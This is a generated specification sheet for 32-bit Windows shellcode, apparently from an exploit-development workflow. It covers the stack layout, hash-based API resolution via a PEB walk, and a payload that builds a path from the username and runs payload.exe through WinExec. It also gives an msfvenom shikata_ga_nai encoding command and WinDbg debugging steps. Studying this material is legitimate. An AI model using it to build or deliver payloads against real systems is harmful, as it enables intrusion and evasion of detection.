# Shellcode Contract

Generated from manifest.

---

# Stack Layout

Frame: `mov ebp, esp` / `sub esp, 0x200` (0x200 bytes reserved)

## Export Context (reserved - do not allocate)

| Offset | Description |
|--------|-------------|
| `[ebp-0x04]` | Module base (transient) |
| `[ebp-0x08]` | AddressOfNames VA |
| `[ebp-0x0c]` | AddressOfNameOrdinals VA |
| `[ebp-0x10]` | AddressOfFunctions VA |
| `[ebp-0x14]` | NumberOfNames |
| `[ebp-0x18]` | Target hash (transient) |

## Module Bases

| Offset | Module |
|--------|--------|
| `[ebp-0x20]` | kernel32.dll |
| `[ebp-0x24]` | advapi32.dll |

## API Table

| Offset | API | Module |
|--------|-----|--------|
| `[ebp-0x28]` | LoadLibraryA | kernel32.dll |
| `[ebp-0x2c]` | GetUserNameA | advapi32.dll |
| `[ebp-0x30]` | WinExec | kernel32.dll |
| `[ebp-0x34]` | ExitProcess | kernel32.dll |

## Variables

| Offset | Variable | Size |
|--------|----------|------|
| `[ebp-0x38]` | username_len | 4 |
| `[ebp-0x3c]` | write_pos | 4 |
| `[ebp-0x40]` | path_buf | 4 |
| `[ebp-0x44]` | guna_ret | 4 |
| `[ebp-0x48]` | exec_ret | 4 |

## Structures

_No structures._

## Strings

| Offset | Label | Value | Size |
|--------|-------|-------|------|
| `[ebp-0x110]` | advapi_dll | advapi32.dll | 16 |
| `[ebp-0x11c]` | path_prefix | C:\Users\ | 12 |
| `[ebp-0x134]` | path_suffix | \Desktop\payload.exe | 24 |

---

# API Contracts

## kernel32.dll

Resolution: PEB walk

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| LoadLibraryA | `0xec0e4e8e` | `[ebp-0x28]` | library |
| WinExec | `0x0e8afe98` | `[ebp-0x30]` | process |
| ExitProcess | `0x73e2d87e` | `[ebp-0x34]` | process |

### API Details

#### LoadLibraryA

**Slot:** `[ebp-0x28]`
**Hash:** `0xec0e4e8e`
**Module:** kernel32.dll
**Category:** library

```c
HMODULE LoadLibraryA(LPCSTR lpLibFileName)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpLibFileName | LPCSTR | e.g. ws2_32.dll |

---

#### WinExec

**Slot:** `[ebp-0x30]`
**Hash:** `0x0e8afe98`
**Module:** kernel32.dll
**Category:** process

```c
UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpCmdLine | LPCSTR | pointer to command string, e.g. cmd.exe |
| 2 | uCmdShow | UINT | SW_SHOWNORMAL = 1 or SW_HIDE = 0 |

---

#### ExitProcess

**Slot:** `[ebp-0x34]`
**Hash:** `0x73e2d87e`
**Module:** kernel32.dll
**Category:** process

```c
VOID ExitProcess(UINT uExitCode)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | uExitCode | UINT | 0 for clean exit |

---

## advapi32.dll

Resolution: `LoadLibraryA("advapi32.dll")` -> base stored at `[ebp-0x24]`

### API Table

| API | Hash | Slot | Category |
|-----|------|------|----------|
| GetUserNameA | `0x5c52aa34` | `[ebp-0x2c]` | identity |

### API Details

#### GetUserNameA

**Slot:** `[ebp-0x2c]`
**Hash:** `0x5c52aa34`
**Module:** advapi32.dll
**Category:** identity

```c
BOOL GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer)
```

| # | Parameter | Type | Notes |
|---|-----------|------|-------|
| 1 | lpBuffer | LPSTR | pointer to buffer receiving the username |
| 2 | pcbBuffer | LPDWORD | pointer to DWORD: in=buffer size, out=chars copied including null |

---

---

# Structure Layouts

---

# Operational Cheatsheet

**Template:** IRGetUsernameTemplate
**Target:** `127.0.0.1:4444`
**Bad characters:** `0x00` `0x0a` `0x0d`

## Setup Commands

**Path built on target:**
```
C:\Users\<username>\Desktop\payload.exe
```

**Note:**
```
Place payload.exe on target Desktop before running
```

## Encoding (if needed)

Remove bad chars with msfvenom (requires `shellcode.bin`):
```
cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode
```

---

# WinDbg Cheatsheet

Run `debug_runner.py` under 32-bit Python. Attach WinDbg to the
python.exe process. Set `bp <address>` using the printed shellcode
address, then press Enter in the script to start execution.

## Quick Reference

| Command | Description |
|---------|-------------|
| `bp <addr>` | Set breakpoint |
| `bl` | List breakpoints |
| `g` | Go (continue) |
| `t` | Step into |
| `p` | Step over |
| `pt` | Step to next return |
| `r` | Show all registers |
| `r eax` | Show one register |
| `u eip L10` | Disassemble next 16 instructions |
| `db <addr> L<n>` | Dump bytes |
| `dd <addr> L<n>` | Dump dwords |
| `da <addr>` | Dump ASCII string |
| `!address <addr>` | Show memory region info |

## Inspect API Pointers After Resolution

After the PEB walk and hash resolution, each resolved function
pointer is stored at its stack slot. Verify with:

```
dd ebp-0x28 L1    ; LoadLibraryA
dd ebp-0x2c L1    ; GetUserNameA
dd ebp-0x30 L1    ; WinExec
dd ebp-0x34 L1    ; ExitProcess
```

## Inspect Structures Before API Calls

## Inspect Stack Strings

```
da ebp-0x110    ; advapi_dll
```

```
da ebp-0x11c    ; path_prefix
```

```
da ebp-0x134    ; path_suffix
```

## Breakpoint Strategy

Set breakpoints at each `call [ebp-0xNN]` in the generated
assembly to pause before each API call. After each call, check
`eax` for the return value:

```
bp <sc_base>+<offset_of_call_LoadLibraryA>
bp <sc_base>+<offset_of_call_GetUserNameA>
bp <sc_base>+<offset_of_call_WinExec>  ; eax>31 on success
bp <sc_base>+<offset_of_call_ExitProcess>  ; does not return
```

Find the call offsets by searching `generated.asm` for
`call [ebp-` instructions. Add the instruction's line offset
from the start of the shellcode to the base address.